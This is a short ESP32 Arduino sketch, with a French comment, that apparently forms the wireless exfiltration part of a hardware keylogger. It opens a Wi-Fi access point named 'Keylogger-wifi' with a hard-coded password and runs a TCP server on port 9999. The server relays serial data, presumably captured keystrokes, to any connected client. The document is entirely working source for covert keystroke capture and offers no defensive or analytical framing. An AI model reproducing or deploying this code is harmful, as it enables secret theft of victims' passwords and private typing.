#include <WiFi.h>
#include <WiFiClient.h>
#include <WiFiAP.h>

const char *ssid     = "Keylogger-wifi";
const char *password = "Azerty1234";

#define RXD1 16
#define TXD1 17

WiFiServer server(9999);

void setup() {
  Serial1.begin(9600, SERIAL_8N1, RXD1, TXD1);

  if (!WiFi.softAP(ssid, password)) {
    log_e("Soft AP creation failed.");
    while(1);
  }
  IPAddress myIP = WiFi.softAPIP();
  server.begin();
}

void loop() {

  WiFiClient client = server.available(); // listen for incoming clients
  if (client) {
    while (client.connected()) {
      if (client.available()) { // attend que le client envoye un caractere
        char c = client.read();
        Serial1.print(c);
      }
      if (Serial1.available()) {
        char c = Serial1.read();
        client.print(c);
        Serial1.print(c);
      }
    }
    client.stop();
  }
  if (Serial1.available()) {
    char c = Serial1.read();
    Serial1.print(c);
  }
}

